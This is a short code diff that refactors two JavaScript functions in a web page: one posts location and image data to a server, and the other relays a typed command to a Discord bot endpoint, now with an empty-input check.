@@ -238,43 +238,38 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    latitude: latitude,
-                    longitude: longitude,
-                    image: imageData
-                })
+                body: JSON.stringify({ latitude, longitude, image: imageData })
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Data sent successfully:', data);
+                console.log(data.message);  // Log success message from the server
             })
-            .catch((error) => {
-                console.error('Error sending data:', error);
+            .catch(error => {
+                console.error('Error sending image data:', error);
             });
         }
 
-        // Function to send a command to Discord bot
         function sendCommand() {
             const command = document.getElementById('command-input').value;
-
-            if (command) {
-                fetch('/send-command', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        command: command
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Command sent to bot:', data);
-                })
-                .catch(error => {
-                    console.error('Error sending command:', error);
-                });
+            if (command.trim() === "") {
+                alert("Please enter a command.");
+                return;
             }
+
+            fetch('/send-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data.message);  // Log success message from the server
+            })
+            .catch(error => {
+                console.error('Error sending command:', error);
+            });
         }
     </script>
 </body>
